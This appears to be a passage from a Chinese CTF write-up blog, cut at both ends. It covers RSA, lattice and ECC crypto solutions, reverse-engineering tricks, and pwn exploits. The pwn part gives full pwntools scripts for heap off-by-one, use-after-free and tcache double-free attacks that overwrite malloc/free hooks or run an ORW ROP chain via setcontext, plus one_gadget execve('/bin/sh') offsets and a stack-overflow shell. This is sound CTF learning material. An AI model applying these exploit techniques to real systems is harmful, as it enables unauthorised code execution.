274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778#q2*q2 = 18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217#n2 = 40588227045595304080360385041082238507044292731344465815296032905633525556943787610712651675460810768762763493579129831271018141591546207557410817432455139315527674932933085299277599173971912445226532235814580879585317211349524406424200622675880992390782025158621241499693400288031658194434641718026910652327933253877313106112861283314274635124734817398465059373562194694957841264834312640926278890386089611103714990646541470577351599526904458342660444968591197606820361364761648205241041444681145820799054413179462285509661124362074093583494932706249461954240408827087015525507173082129412234486228092002841868365895837463699200959915782767657258729794037776401995309244941171415842403617486719492483671490834562579225506831496881542530519595438932482796867853234159664409420977526102480385193101883785161080269573707156626838551506024455480650224305894501968583442346807126920740779780593650871645915149689424292912611578291912721896864772950410266629045542480009266574096080138709683466489568290569363478444349563498507530805502511051165160827192795520182720802422213364247355775222858214648603034743679187470844212529134374975737510982287957316878179964602394749601431823167982157434890459245394370728942790117156485268116758052636794417268680901420193002289035538753620555488506926366624641291881353268617130968991258983002165300186971963661666476600998389048880565199317280428349802824448329898502788492233381873026217202981921654673840142095839603360666049476100561268336225902504932800605464136192275593886736746497955270280541423593#c2 = 25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054568802145921399726673752722820646807494657299104190123945675647 这道题分两部分，第一部分是祥云杯2020的RSAssss原题，直接套脚本 #part 1from Crypto.Util.number import *from gmpy2 import *e = 0x10001n = 6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911c = 6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826def fermat_factorization(n): factor_list = [] get_context().precision = 2048 x = int(sqrt(n)) while True: x += 1 y2 = x ** 2 - n if is_square(y2): #print('x = ',x) y2 = mpz(y2) get_context().precision = 2048 y = int(sqrt(y2)) factor_list.append([x+y, x-y]) if len(factor_list) == 2: break return factor_listdef main(): factor_list = fermat_factorization(n) #print(factor_list) [X1, Y1] = factor_list[0] [X2, Y2] = factor_list[1] assert X1 * Y1 == n assert X2 * Y2 == n p1 = gcd(X1, X2) q1 = X1 // p1 p2 = gcd(Y1, Y2) q2 = Y1 // p2 #print('p1 =',p1) #print('p2 =',p2) #print('q1 =',q1) #print('q2 =',q2) phi = (p1 - 1) * (q1 - 1) * (p2 - 1) * (q2 - 1) d = inverse(e, phi) flag = long_to_bytes(pow(c, d, n)) print(flag)if __name__ == &quot;__main__&quot;: main() 第二部分是解方程，如下 from sympy import *q = Symbol('q')p = Symbol('p')print(solve([p+q - 274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778,p*q - 18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217],[p,q]))import gmpy2import binasciie = 0x10001q2 = 118403784459455138582919377906131738592946190895354489225890530955489713357948723774385902598164582767355529878101682058998518634444589192617157682795489868846289962039288493883412519273541770945888153150197763095564026103787571812611196732248676365740482179339301570536662025044058993433932899960459852671737p2 = 156369362301683324125218204402965647844847700898336893807965993347521097936153209680438582412356886147490621941774361449543361003099855063903583735699989524930842868946568028125148569137321044967404135533563894823557903913169345053238064421472421305575401290009671355220416064671043038807885626965528792907041n2 = p2*p2*q2*q2*q2c2 = 25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054568802145921399726673752722820646807494657299104190123945675647phi = (p2*p2-p2)*(q2**3-q2*q2)d = gmpy2.invert(e,phi)m = gmpy2.powmod(c2,d,n2)print(binascii.unhexlify(hex(m)[2:])) 两部分合起来得到flag flag{Euler_funct1ons_1s_very_interst1ng} Misc[warmup]音频隐写直接AU打开看频谱图 flag{f8fbb2c761821d3af23858f721cc140b} reversehellowrold花指令 尝试修了一下（。然后勉强能看到逻辑大概意思就是循环字符长度次数的（input[i]^0x22)+3 s=[188,10,187,193,213,134,127,10,201,185,81,78,136,10,130,185,49, 141,10,253,201,199,127,185,17, 78, 185, 232, 141, 87]def xoor(a): return ((a-3)^0x22)&amp;0xffa=10for k in range(len(s)): a=s[k] for i in range(30): a=xoor(a) print(chr(a),end='') #flag{helo_w0rld_W3lcome_70_R3} 打卡送分题？还害我搞了半天。。直接androidkiller打开改 not admin 为admin， 编译，安装然后直接点一下图片就出了 flag{1cd8a8623acf512ea7a96c5305f1be9f} easy_re也有指令。nop去掉。#11 22 33 可以正常f5 发现是一个流密码rc4，，不管，我们随便输入密文长的明文进来。，然后dump出假密文，然后用假密文异或假明文得到密钥流，然后用密钥流对密文进行异或得到明文 d=[ 0xF5, 0x8C, 0x8D, 0xE4, 0x9F, 0xA5, 0x28, 0x65, 0x30, 0xF4, 0xEB, 0xD3, 0x24, 0xA9, 0x91, 0x1A, 0x6F, 0xD4, 0x6A, 0xD7, 0x0B, 0x8D, 0xE8, 0xB8, 0x83, 0x4A, 0x5A, 0x6E, 0xBE, 0xCB, 0xF4, 0x4B, 0x99, 0xD6, 0xE6, 0x54, 0x7A, 0x4F, 0x50, 0x14, 0xE5, 0xEC]dd=[ 0xA3, 0xD0, 0xDC, 0xB3, 0xD4, 0xF6, 0x2D, 0x30, 0x30, 0xA2, 0xEE, 0x85, 0x22, 0xB4, 0xC7, 0x1D, 0x66, 0x81, 0x77, 0xD2, 0x59, 0x84, 0xBA, 0xA5, 0x8A, 0x42, 0x52, 0x38, 0xA3, 0xC9, 0xFC, 0x1D, 0x99, 0xD2, 0xE0, 0x55, 0x7B, 0x48, 0x58, 0x14, 0xE7, 0xA1]s='000000000000000000000000000000000000000000'for i in range(len(s)): print(chr(ord(s[i])^dd[i]^d[i]),end='') #flag{c5e0f5f6-f79e-5b9b-988f-28f046117802} 抛石机照着题目抄一遍成z3，利用了网上抄的一个浮点数转hex的函数 import structdef double_to_hex(f): return hex(struct.unpack('&gt;Q', struct.pack('&lt;d', f))[0] &amp; 0xffffffff)[2:].zfill(8)from z3 import *x = Real('x')y = Real('y')z = Real('z')m = Real('m')v4 = 149.2 * x + x * -27.6 * x - 129.0v3 = 149.2 * y + y * -27.6 *y - 129.0v2 = z * -39.6 * z + 59.2 *z + 37.8v1 = m * -39.6 * m + 59.2 * m + 37.8s = Solver()s.add(x &lt; y - 0.001)s.add(z &lt; m - 0.001)s.add(v4 &gt; -0.00003,v4 &lt; 0.00003)s.add(v3 &gt; -0.00003,v3 &lt; 0.00003)s.add(v2 &gt; -0.00002,v2 &lt; 0.00002)s.add(v1 &gt; -0.00003,v1 &lt; 0.00003)s.check()print(s.model())z = -1012239/2097152y = 141727/32768x = 1133125/1048576m = 259211/131072print('flag{'+double_to_hex(x)+'-'+double_to_hex(y)[:4]+'-'+double_to_hex(y)[4:]+'-'+double_to_hex(z)[:4]+'-'+double_to_hex(z)[4:]+double_to_hex(m)+'}')#flag{454af13f-f84c-1140-1ee4-debf58a4ff3f} pwnNull_pwn解题思路：有off by one漏洞，且show功能正常，直接利用残留指针泄露libc，再改size造成堆重叠，实现任意chunk分配，打mallochook。 from pwn import *#p=process('./null_pwn')p=remote('82.157.5.28',51204)context.log_level='debug'libc=ELF('/home/root2/Desktop/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so')def menu(id): p.sendlineafter('Your choice :',str(id))def add(id,size,content): menu(1) p.sendlineafter('Index:',str(id)) p.sendlineafter('Size of Heap : ',str(size)) p.sendlineafter('Content?:',str(content))def delete(id): menu(2) p.sendlineafter('Index:',str(id))def edit(id,content): menu(3) p.sendlineafter('Index:',str(id)) p.sendlineafter('Content?:',str(content))def show(id): menu(4) p.sendlineafter('Index :',str(id))add(0,0x4f0,'aaaa')add(1,0x18,'bbbb')add(2,0x60,'bbbb')add(3,0x60,'cccc')add(4,0x60,'cccc')delete(0)add(0,0x4f0,'')show(0)libc_base=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&quot;\\x00&quot;))+0x7f60e8812000-0x7f60e8bd6b0asuccess('libc_base:'+hex(libc_base))edit(1,'a'*0x18+'\\xe1')delete(2)delete(3)add(2,0xd0,'a'*0x60+'b'*8+p64(0x71)+p64(libc_base+libc.sym['__malloc_hook']-0x23))add(3,0x60,'aaaa')add(5,0x60,'a'*0x13+p64(libc_base+0xf1247))#add(6,0x10,'aaa')#gdb.attach(p)p.interactive()'''0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL ezuaf解题思路:有uaf漏洞，free个fastbin范围外的chunk再show泄露残余指针算libc基地址，再edit那个0x70大小的chunk的fd，实现任意chunk分配，打mallochook。 from pwn import *#p=process('./uaf_pwn')p=remote('82.157.5.28',50702)libc=ELF('/home/root2/Desktop/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/libc.so.6')context.log_level='debug'def menu(id): p.sendlineafter('&gt;',str(id))def add(size): menu(1) p.sendlineafter('size&gt;',str(size))def delete(id): menu(2) p.sendlineafter('index&gt;',str(id))def edit(id,content): menu(3) p.sendlineafter('index&gt;',str(id)) p.sendlineafter('content&gt;',str(content))def show(id): menu(4) p.sendlineafter('index&gt;',str(id))add(0x100)add(0x10)delete(0)show(0)libc_base=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&quot;\\x00&quot;))-0x7f3068b0fb78+0x7f306874b000success('libc_base:'+hex(libc_base))add(0x60)delete(2)edit(2,p64(libc_base+libc.sym['__malloc_hook']-0x23))add(0x60)add(0x60)edit(4,'a'*0x13+p64(libc_base+0x4527a))#gdb.attach(p)p.interactive()'''0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL GreentownNote解题思路：2.27的libc，有uaf漏洞，还是利用残余指针泄露，再用tcache double free打freehook，再用setcontext劫持执行流到堆区执行布置好的rop实现orw。 from pwn import *#p=process('./GreentownNote')p=remote('82.157.5.28',50901)libc=ELF('/home/root2/Desktop/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc-2.27.so')context.log_level='debug'context.arch='amd64'def menu(id): p.sendlineafter('&gt; Your choice :',str(id))def add(size,con): menu(1) p.sendlineafter('&gt; Note size :',str(size)) p.sendlineafter('&gt; Content :',str(con))def show(id): menu(2) p.sendlineafter('| Index :',str(id))def delete(id): menu(3) p.sendlineafter('| Index :',str(id))add(0xf0,'aaaa')add(0x200,'aaaa')for i in range(7): delete(0)show(0)p.recvuntil('| Content: ')heap_base=u64(p.recv(6).ljust(8,'\\x00'))success('heap_base:'+hex(heap_base))delete(0)show(0)p.recvuntil('| Content: ')libc_base=u64(p.recv(6).ljust(8,'\\x00'))-0x7fa6ff1f6ca0+0x7fa6fee0b000success('libc_base:'+hex(libc_base))pop_rdi=libc_base+0x000000000002155fpop_rsi=libc_base+0x0000000000023e6apop_rdx=libc_base+0x0000000000001b96ret=libc_base+0x00000000000008aaflag=heap_base+0x559ccab80570-0x559ccab80260orw=heap_base+0x562a3e8eb680-0x562a3e8eb260success('flag:'+hex(flag))success('orw:'+hex(orw))rop=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(libc_base+libc.sym['open'])rop+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base+0x1000)+p64(pop_rdx)+p64(0x100)+p64(libc_base+libc.sym['read'])rop+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_base+0x1000)+p64(libc_base+libc.sym['write'])frame = SigreturnFrame()frame.rsp = orwframe.rip = retadd(0x100,'./flag\\x00')add(0x100,rop)delete(1)delete(1)add(0x200,p64(libc_base+libc.sym['__free_hook']))add(0x200,str(frame))add(0x200,p64(libc.sym['setcontext']+53+libc_base))#gdb.attach(p,'b *setcontext+53')p.interactive()","link":"/posts/47585/"},{"title":"2021第五空间大赛WP","text":"2021第三届第五空间网络安全大赛WP 成绩总榜第十九名，社企组第二名 PwnbountyhunterIda查看发现栈溢出漏洞，有system，有’/bin/sh’ Checksec from pwn import *#p=process('./pwn')p=remote('139.9.123.168',32548)elf=ELF('./pwn')#gdb.attach(p,'b *0x4011AA')p.sendlineafter('Who are you? What do you want?\\n','a'*0x90+'b'*8+p64(0x0000000000401016)+p64(0x000000000040120b)+p64(0x403408)+p64(elf.sym['system']))p.interactive() 个人信息保护data_protection题目分5问。 $n$比较小，factordb上面可以直接找到分解； $p$已知，而且明文小于$p$。直接模$p$分析，$\\varphi(p)=p-1$即可； 模$p$下给了一个线性方程组，直接解即可； 前面已经生成了642个随机数，但是部分随机数的具体值未知，需要爆破 这些未知的随机数具体包括： 第1问的$a$和$b$，值介于$p$和$q$，并且$a$和$b$生成的先后顺序不确定； 第2问的$q$，值介于$p$和$p+2^{31}$，还有一位不确定。 已知624个随机数，就可以恢复随机种子，进而求出AES密钥。然后根据题目已知信息尝试解密成明文检验明文是否合法。 接第4问已知随机种子可以求出DH算法的私钥$x, y$，进而求出DH算法的shared secret $s$。乘以$s$的模逆即可。 这关键就在4.需要科学爆破一下然后就是附上exp: e1.py from Crypto.Util.number import *with open('out') as f: s = f.read().splitlines()c = eval(s[0])n = eval(s[1])p = 22186905890293167337018474103q = 64390888389278700958517837593e = 65537d = inverse(e, (p-1)*(q-1))m = pow(c, d, n)print(long_to_bytes(m))# xiaoMing e2.py from Crypto.Util.number import *with open('out') as f: s = f.read().splitlines()c = eval(s[2])n = eval(s[3])p = 11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526561468278997e = 65537q = n // pdp = inverse(e, (p-1))m = pow(c, dp, p)print(m.bit_length())print(p.bit_length())print(long_to_bytes(m))# 14115102907 e3.sage with open('out') as f: s = f.read()s = s.splitlines()q = eval(s[4])A = eval(s[5])b = eval(s[6])A = Matrix(Zmod(q), A)b = vector(Zmod(q), b)x = A.solve_right(b)x = ''.join([chr(i) for i in x])print(x)# xiaoMing@amail.com e4.py import randomfrom Crypto.Util.number import *from Crypto.Cipher import AESfrom randcrack import RandCrackimport stringimport itertoolsfrom tqdm import tqdmimport picklewith open('out') as f: s = f.read().splitlines()c4 = eval(s[7])c4 = long_to_bytes(c4)ok_char = string.ascii_letters + string.digits + '._'ok_char = list(ok_char.encode())p1 = 22186905890293167337018474103q1 = 64390888389278700958517837593n2 = eval(s[3])p2 = 11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526561468278997offset2 = n2 // p2 - p2with open('out') as f: s = f.read().splitlines()s = eval(s[5])s = [x for y in s for x in y]append_2 = b'\\xf1\\x0f\\xb5\\xb5\\xae\\xf0\\x05\\x92BWR\\xd0&gt;\\x91\\x0cv\\xbc ]\\x81'append_2 = bytes_to_long(append_2)def my_submit(rc, x, t): for i in range(t): rc.submit(x % (1 &lt;&lt; 32)) x &gt;&gt;= 32for a1, b1 in [[p1, q1], [q1, p1]]: aleft = a1 - 1 while (not isPrime(aleft)): aleft -= 1 bleft = b1 - 1 while (not isPrime(bleft)): bleft -= 1 for aa, bb, o2 in tqdm(itertools.product(range(aleft, a1)[::-1], range(bleft, b1)[::-1], range(2))): rc = RandCrack() my_submit(rc, aa, 3) my_submit(rc, bb, 3) my_submit(rc, append_2, 5) off2 = 2 * offset2 + o2 my_submit(rc, off2, 1) for i in s: rc.submit(i) key = rc.predict_getrandbits(128) key = long_to_bytes(key, 16) cipher = AES.new(key, AES.MODE_ECB) m = cipher.decrypt(c4) if (all(x in ok_char for x in m)): print(m) print() print(aa) print(bb) print(off2) exit(0)# No.123_doge_road e5.py from Crypto.Util.number import *from Crypto.Cipher import AESfrom randcrack import RandCrackaa = 22186905890293167337018474102bb = 64390888389278700958517837515off2 = 3288350018with open('out') as f: ss = f.read().splitlines()s = eval(ss[5])c4 = eval(ss[7])c4 = long_to_bytes(c4)s = [x for y in s for x in y]append_2 = b'\\xf1\\x0f\\xb5\\xb5\\xae\\xf0\\x05\\x92BWR\\xd0&gt;\\x91\\x0cv\\xbc ]\\x81'append_2 = bytes_to_long(append_2)def my_submit(rc, x, t): for i in range(t): rc.submit(x % (1 &lt;&lt; 32)) x &gt;&gt;= 32rc = RandCrack()my_submit(rc, aa, 3)my_submit(rc, bb, 3)my_submit(rc, append_2, 5)my_submit(rc, off2, 1)for i in s: rc.submit(i)key = rc.predict_getrandbits(128)key = long_to_bytes(key, 16)cipher = AES.new(key, AES.MODE_ECB)m = cipher.decrypt(c4)print(m)q, g, h = [eval(x) for x in ss[8].split()]c1, c2 = [eval(x) for x in ss[9].split()]gg = rc.predict_randrange(q-1)print(g == gg)x = rc.predict_randrange(q-1)y = rc.predict_randrange(q-1)s = pow(g, x*y, q)m5 = c2 * inverse(s, q) % qprint(long_to_bytes(m5))# Make666GreatAgain_University finexp.py from hashlib import sha256name = b'xiaoMing'phone = b'14115102907'mail = b'xiaoMing@amail.com'address = b'No.123_doge_road'school = b'Make666GreatAgain_University'flag = 'flag{'+sha256(name).hexdigest()[:8]+'-'+sha256(phone).hexdigest()[:4]+'-'+sha256(mail).hexdigest()[:4]+'-'+sha256(address).hexdigest()[:4]+'-'+sha256(school).hexdigest()[:12]+'}'print(flag)##flag{073fa53e-4246-dd1d-54a0-0c268444ad09} Cryptodoublesage模$p$意义下求$x$使得范数$|xA-C|$小这个问题在一般的实数域内就对应伪逆 pseudoinverse A^{+}对于方程$Ax=b$，利用伪 逆$A^{+}$，我们可以求得$x=A^{+}b$，这个$x$就是使得$|Ax-b|$最小的那个$x$。回到问题。上式求转置即为：$$A^T x^T - C^T$$所以只需要求得$A^T$的伪逆，再乘上$C^T$即可得到$x$的值。然后可能单次尝试不能通过检验，需要多次尝试，就能通过检验。exp: from pwn import *from sage.all import *def gao_problem(p, p, rows): p.recvuntil('Matrix A') p.recvline() def get_vector(p): p.recvuntil('[') s = p.recvuntil(']')[:-1] return [int(x) for x in s.split()] A = [] for i in range(rows): s = get_vector(p) A.append(s) p.recvline() b = p.recvline() b = get_vector(p) Zp = Zmod(p) A = Matrix(Zp, A) b = vector(Zp, b) x = A.transpose().pseudoinverse() * b print(x * A) print(b) x = str(x).replace('(', '[').replace(')', ']') p.sendline(x) p.recvuntil('The norm of vector x*A-C is') res = p.recvline() if (b'True' in res): print('Pass chall {}'.format(p)) return True else: print('Fail chall {}'.format(p)) return Falsewhile True: #p = process(['sage', 'another.sage']) p = remote('122.112.210.186',51436) if gao_problem(p, 29, 5) and gao_problem(p, 227, 15): p.interactive() else: p.close() 当然，由于该需要exp需要sage.all库，因此我们需要在sagemath上或者也可以用cocalc在线跑一下。 secrets题目需要求32位的$p_1, p_2, p_3$使得$$a_1 p_2 p_3 + a_2 p_1 p_3^2 + a_3 p_1 p_2^2 p_3 \\equiv n \\ (\\bmod p)$$ 格基规约。首先我们要让某个线性组合变成一个小值。我们看上了$p_2 p_3$这一项。于是同余式两边乘上$a_1^{-1}$：$$p_2 p_3 + a_1^{-1} a_2 p_1 p_3^2 + a_1^{-1} a_3 p_1 p_2^2 p_3 \\equiv a_1^{-1} n \\ (\\bmod p)$$写成等式：$$p_2 p_3 + a_1^{-1} a_2 p_1 p_3^2 + a_1^{-1} a_3 p_1 p_2^2 p_3 = a_1^{-1} n + kp$$移项：$$p_2 p_3 = a_1^{-1} n - a_1^{-1} a_2 p_1 p_3^2 - a_1^{-1} a_3 p_1 p_2^2 p_3 + kp$$便有以下格：$$\\begin{bmatrix}1 &amp; p_1 p_3^2 &amp; p_1 p_2^2 p_3 &amp; k\\end{bmatrix}\\begin{bmatrix}n &amp; 1 &amp; 0 &amp; 0 &amp; 0 \\-a_1^{-1} &amp; 0 &amp; 1 &amp; 0 &amp; 0 \\-a_1^{-1} a_2 &amp; 0 &amp; 0 &amp; 1 &amp; 0 \\p &amp; 0 &amp; 0 &amp; 0 &amp; 1 \\\\end{bmatrix}=\\begin{bmatrix}p_2 p_3 &amp; 1 &amp; p_1 p_3^2 &amp; p_1 p_2^2 p_3 &amp; k\\end{bmatrix}$$右乘一个平衡的对角阵之后用LLL就可以求出$(p_2 p_3, p_1 p_3^2, p_1 p_2^2)$的值，从而求出$(p_1, p_2, p_3)$然后求出AES密钥并且解密。具体解题思路： 用sage求出p2p3 p1p3^2 p1p2^2p3 sage p = 11679673793673506009014468475228106603081916890883486457896646429223178797758973615616012286356332520190126233017400893207593826175343702713785184522338787a1, a2, a3 = [5756069086948558901324622226613545219570714553931419680091355546860288277733528684484679434350356392958470286317659356659575912829589095426942951584457183, 5460203359401780189277241557890921761977539358779669504676049669202545991278492450421493921244274437911819362776150796839590850454405186576054578519831639, 5733215264737754744921226160962972135334918697201206464452013241762591234783172108441892372068592924627684842613967215477538096712289370260146873046574651]e = [[0, 1, 1], [1, 0, 2], [1, 2, 1]]n = 954454001962944951493670572521755832608771383398769255721246850106731347064788730658352434771777089459134929238824940227065118832204119439793656116218597c = '19bc72bc5f28141419994d237c84f314d9343e775722521b1eb369cb4fb5fa85'c1 = inverse_mod(a1, p) * nc2 = -a2 * inverse_mod(a1, p) % pc3 = -a3 * inverse_mod(a1, p) % pc4 = pweights = [2^(512-64), 2^512, 2^(512-96), 2^(512-128), 1]M = Matrix(ZZ, [[c1, 1, 0, 0, 0], [c2, 0, 1, 0, 0], [c3, 0, 0, 1, 0], [c4, 0, 0, 0, 1]]) * diagonal_matrix(weights) v = M.LLL()[0]p2p3 = v[0] // weights[0]p1p32 = v[2] // weights[2]p1p22p3 = v[3] // weights[3]print(p2p3)print(p1p32)print(p1p22p3) factordb查分解 弄出p1 p2 p3具体值 from z3 import *p1, p2, p3 = Ints('p1 p2 p3')sol = Solver()sol.add(p2 * p3 == 13661139160116902777)sol.add(p1 * p3 ** 2 == 29300368481521898734987896109)sol.add(p1 * p2 ** 2 * p3 == 145206870370195317357010045446286801073)if (sol.check() == sat): print(sol.model())else: print('GG simida') 把p1 p2 p3具体值填到finexp.py得到最后的flag finexp.py import random, hashlibfrom Crypto.Util.number import *from Crypto.Cipher import AESp1 = 2607953941p2 = 4075682389p3 = 3351865493secrets = [p1, p2, p3]c = '19bc72bc5f28141419994d237c84f314d9343e775722521b1eb369cb4fb5fa85'c = bytes.fromhex(c)key = hashlib.sha256(str(secrets).encode()).digest()cipher = AES.new(key, AES.MODE_ECB)flag = cipher.decrypt(c)print(flag)# flag{f6c279906556477981c0698e6239982e} signin题目给出$n=pq$以及$x = (p \\oplus q) \\bmod 2^{400}$，需要求n的分解 RSA+xor，从低位到高位枚举分析。也就是依次模$2^1, 2^2, \\ldots, 2^{400}$进行分析。每次枚举$p, q$的高位并且利用$n$和$x$进行验算。这样到400位，就可以求出若干$p, q$的低400位。然后对于每个可能的低位$p$，构造多项式$$f(x) = 2^{400} x + p$$并用Coppersmith small root求解$x$，进而得到$p$，也就得到了$n=pq$的分解之后就算得解密指数$d$，解密密文即可。 e1.py from sage.all import *from tqdm import tqdmc = 51527129112041727084653138724362414261275943766050564614480874091504860204252606590600308110384082623259378144308474054746140923358753034723604762350226880256680349452009792177706794254189892857145865023696386031044387376465031791954744691766962599322069213009628794080376529614779412009851632855178036285523e = 65537n = 116652897843293883441819903375596603379518724751574619124014296798496676038791377773876686025057284152512331129032274361942198246462102132225928556778732123779685850832525256744533855512548226749675828320075447142642844219402725358384766251737244370235962898005154181991761923091468959986835373399473596976197x = 471475951883841996380755394497425485938102193317354065361151516006175011110693734273770491686812217784012615381122407908pre_sol = [(1, 1)]for i in tqdm(range(1, 400)): cur_pow = (1 &lt;&lt; (i+1)) cur_sol = [] for pre_p, pre_q in pre_sol: for s in range(2): for t in range(2): cur_p = pre_p + s * (1 &lt;&lt; i) cur_q = pre_q + t * (1 &lt;&lt; i) if (cur_p ^ cur_q == x % cur_pow and cur_p * cur_q % cur_pow == n % cur_pow): cur_sol.append((cur_p, cur_q)) pre_sol = cur_solF, x = PolynomialRing(Zmod(n), name='x').objgen()print(F)print(x)for p, q in tqdm(cur_sol): f = x * 2 ** 400 + p f = f.monic() sol = f.small_roots(X = 2 ** 112, beta = 0.4) if (sol != []): print(sol[0] * 2 ** 400 + p) break e2.py from Crypto.Util.number import *p = 12172529005716175430901283903834642726755657633565845783363589139718811888175215203727237853050161503063968274652006993195449591640852850585439495172789713c = 51527129112041727084653138724362414261275943766050564614480874091504860204252606590600308110384082623259378144308474054746140923358753034723604762350226880256680349452009792177706794254189892857145865023696386031044387376465031791954744691766962599322069213009628794080376529614779412009851632855178036285523e = 65537n = 116652897843293883441819903375596603379518724751574619124014296798496676038791377773876686025057284152512331129032274361942198246462102132225928556778732123779685850832525256744533855512548226749675828320075447142642844219402725358384766251737244370235962898005154181991761923091468959986835373399473596976197q = n // pd = inverse(e, (p-1)*(q-1))m = pow(c, d, n)print(long_to_bytes(m))##flag{f092l9er-hgmj-lw5q-5d52-hwayzk6n5joj} ecc直接梭。。。 p = 146808027458411567A = 46056180B = 2316783294673E = EllipticCurve(GF(p),[A,B])P=E(119851377153561800 , 50725039619018388)Q=E (22306318711744209 , 111808951703508717)print(discrete_log(Q,P,operation='+'))#13566003730592612 用题目给的代码梭。。。 p = 1256438680873352167711863680253958927079458741172412327087203 A = 377999945830334462584412960368612B = 604811648267717218711247799143415167229480E = EllipticCurve(GF(p),[A,B])P=E(550637390822762334900354060650869238926454800955557622817950, 700751312208881169841494663466728684704743091638451132521079)Q=E(1152079922659509908913443110457333432642379532625238229329830 ,819973744403969324837069647827669815566569448190043645544592)primes = [2,5,7,27,212117,302426983]dlogs = []for fac in primes: t = int(int(E.order()) / 